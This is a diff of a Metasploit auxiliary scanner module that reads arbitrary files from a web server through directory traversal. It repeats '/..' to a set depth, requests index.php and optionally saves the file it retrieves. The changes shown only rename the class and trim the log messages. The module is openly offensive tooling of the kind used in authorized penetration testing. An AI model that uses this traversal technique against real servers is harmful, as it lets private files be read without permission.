@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
     t = "/.." * datastore['DEPTH']
 
-    vprint_status("#{peer} - Retrieving #{datastore['FILE']}")
+    vprint_status("Retrieving #{datastore['FILE']}")
 
     # No permission to access.log or proc/self/environ, so this is all we do :-/
     uri = normalize_uri(uri, 'index.php')
@@ -58,13 +58,13 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if not res
-      vprint_error("#{peer} - Server timed out")
+      vprint_error("Server timed out")
     elsif res and res.body =~ /Error 404 requested page cannot be found/
-      vprint_error("#{peer} - Either the file doesn't exist, or you don't have the permission to get it")
+      vprint_error("Either the file doesn't exist, or you don't have the permission to get it")
     else
       # We don't save the body by default, because there's also other junk in it.
       # But we still have a SAVE option just in case
-      print_good("#{peer} - #{datastore['FILE']} retrieved")
+      print_good("#{datastore['FILE']} retrieved")
       vprint_line(res.body)
 
       if datastore['SAVE']
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
           res.body,
           ::File.basename(datastore['FILE'])
         )
-        print_good("#{peer} - File saved as: #{p}")
+        print_good("File saved as: #{p}")
       end
     end
   end
